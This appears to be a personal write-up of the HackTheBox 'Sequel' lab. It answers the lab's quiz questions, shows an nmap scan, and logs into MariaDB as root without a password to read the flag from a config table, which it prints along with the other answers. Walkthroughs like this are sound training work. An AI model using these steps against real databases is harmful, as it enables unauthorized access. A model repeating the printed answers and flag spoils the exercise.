---
title: Máquina Sequel
published: true
---

Jorge Marco Arráez

1.  What does the acronym SQL stand for? 

Structured Query Language

2.   During our scan, which port running mysql do we find?
```
nmap -A -sCV -vv -T4 -n -oN nmap/ports $IP
```

3306

3.  What community-developed MySQL version is the target running? 

MariaDB

4.  What switch do we need to use in order to specify a login username for the MySQL service?
```
-u
```
5.  Which username allows us to log into MariaDB without providing a password? 

root

6.  What symbol can we use to specify within the query that we want to display eveything inside a table?

'*'

7.   What symbol do we need to end each query with?  

';'

8.  Submit root flag 
```
mysql --host $IP -P 3306 -u root
SHOW DATABASES;
use htb;
SHOW TABLES;
SHOW FIELDS FROM config;
SELECT * from config;
```

| id           | name                    | value        |
|:-------------|:------------------------|:-------------|
| 1            | timeout                 | 60s          |
| 2            | security                | default      |
| 3            | auto_logon              | false        |
| 4            | max_size                | 2M           |
| 5            | flag                    | 7b4bec00d1a39e3dd4e021ec3d915da8 |
| 6            | enable_uploads          | false        |
| 7            | authentication_methods  | radius       |
 
```
flag=7b4bec00d1a39e3dd4e021ec3d915da8
```
